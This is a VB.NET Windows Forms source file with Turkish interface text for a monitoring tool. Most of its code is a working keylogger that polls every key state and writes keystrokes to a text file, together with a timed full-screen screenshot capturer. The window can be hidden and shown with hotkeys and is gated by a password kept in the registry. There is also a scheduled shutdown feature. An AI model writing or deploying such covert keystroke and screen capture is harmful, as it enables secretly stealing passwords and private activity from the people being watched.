Imports Microsoft.Win32
Public Class AnaMenu

#Region "Keylogerr"
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Dim Keys As Integer
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles keytimer.Tick
        Try
            For i = 1 To 255
                Keys = 0
                Keys = GetAsyncKeyState(i)
                If Keys = -32767 Then
                    keyytext.Text = keyytext.Text + Chr(i)
                End If

            Next

            My.Computer.FileSystem.WriteAllText("C:\PasperText.txt", keyytext.Text, False)
        Catch
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles keyButon.Click

        Try
            If keytimer.Enabled = False Then
                keytimer.Enabled = True
                keyButon.Text = "DURDUR"
            ElseIf keytimer.Enabled = True Then
                keytimer.Enabled = False
                keyButon.Text = "BAŞLAT"
            End If
        Catch
        End Try
    End Sub
#End Region

#Region "EkranGörüntüsü"
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
    Dim a As Integer
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles fotoButon.Click
        If ekransure.Text = "" Then
            MsgBox("Görüntü Alma Süresi Boş Bırakılamaz")
        Else

            Dim sure As Integer = ekransure.Text * 1000

            fototimer.Interval = sure


            If fototimer.Enabled = False Then
                fototimer.Enabled = True
                fotoButon.Text = "DURDUR"
            ElseIf fototimer.Enabled = True Then
                fototimer.Enabled = False
                fotoButon.Text = "BAŞLAT"
            End If
        End If
    End Sub

    Private Sub Timer1_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles fototimer.Tick
        Dim bounds As Rectangle

        Dim screenshot As System.Drawing.Bitmap

        Dim graph As Graphics

        bounds = Screen.PrimaryScreen.Bounds

        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)

        graph = Graphics.FromImage(screenshot)

        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)

        PictureBox1.Image = screenshot

        PictureBox1.Image.Save("C:\RESİMLERPASPER\resim" & a & ".jpg")

        a = a + 1
    End Sub
#End Region

    Private Sub AnaMenu_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ShowInTaskbar = True
        Try
            Dim yol As String = "RESİMLERPASPER"
            Dim durum As Boolean = IO.File.Exists(yol)
            If (durum = False) Then
                IO.Directory.CreateDirectory("C:\RESİMLERPASPER")
            End If
            Dim uzantı As String = "PasperText.txt"
            Dim belirti As Boolean = IO.File.Exists(uzantı)
            If (uzantı = False) Then
                IO.Directory.CreateDirectory("C:\PasperText.txt")
            End If
        Catch
        End Try

    End Sub
#Region "PC KAPAT"
    Dim b, j As Integer
    Dim TM As Date
    Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If (RadioButton1.Checked = False) Then
            MsgBox("Sistem ve Zamanlama ayarları boş geçilemez", MsgBoxStyle.Critical, "HATA")
        ElseIf (kapadk.Text = "") Then
            MsgBox("Dakika kısmı boş geçilemez", MsgBoxStyle.Critical, "Hata")
        Else

            MsgBox("Bilgisayarınız  " + kapasaat.Text + "   Saat  " + kapadk.Text + " Dakika Sonra Kapanacaktır.", MsgBoxStyle.Exclamation, "UYARI")
            TM = Now.AddMinutes(Val(kapasaat.Text) * 60 + Val(kapadk.Text))
            Timer2.Enabled = True
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If Now > TM Then
            If RadioButton1.Checked = True Then System.Diagnostics.Process.Start("ShutDown", "-s -t 01")
            Timer1.Enabled = False
            Timer2.Enabled = False

        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Timer2.Enabled = False
        MsgBox("Kapatma İşlemi Durduruldu", MsgBoxStyle.Information, "DURDUR")

    End Sub
#End Region
#Region "Giris"
    Private Sub girisbtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles girisbtn.Click

        Try

   
        If TextBox1.Text = Registry.CurrentUser.OpenSubKey("PSPR").GetValue("pasper") Then

            GroupBox1.Visible = True
            GroupBox7.Visible = True
            GroupBox2.Visible = True
            GroupBox8.Visible = False
            TextBox1.Text = " "
        Else
            MsgBox("Girdiğiniz Şifre Hatalı!!! ", MsgBoxStyle.Critical, "Yanlış Sifre")
        End If

        Catch ex As Exception
            MsgBox("Girdiğiniz Şifre Hatalı!!! ", MsgBoxStyle.Critical, "Yanlış Sifre")

        End Try
    End Sub

    Private Sub dgstrbtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles dgstrbtn.Click
        If TextBox2.Text = Registry.CurrentUser.OpenSubKey("PSPR").GetValue("pasper") Then
            Registry.CurrentUser.CreateSubKey("PSPR").SetValue("pasper", TextBox3.Text)
            MsgBox("Şifre Değiştirildi...", MsgBoxStyle.SystemModal, ";)")


        Else

            MsgBox("Mevcut Şifreniz Hatalı", MsgBoxStyle.Critical, "Hata")



        End If

    End Sub
#End Region
#Region "Gizle/Göster"

    Private Sub gizle_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles gizle.Tick

        If GetAsyncKeyState(vKey:=123) = -32767 Then
            Me.Visible = False
        ElseIf GetAsyncKeyState(vKey:=122) = -32767 Then
            Me.Visible = True
            GroupBox1.Visible = False
            GroupBox7.Visible = False
            GroupBox2.Visible = False
            GroupBox8.Visible = True
        End If
    End Sub


#End Region

    Private Sub Label9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
End Class
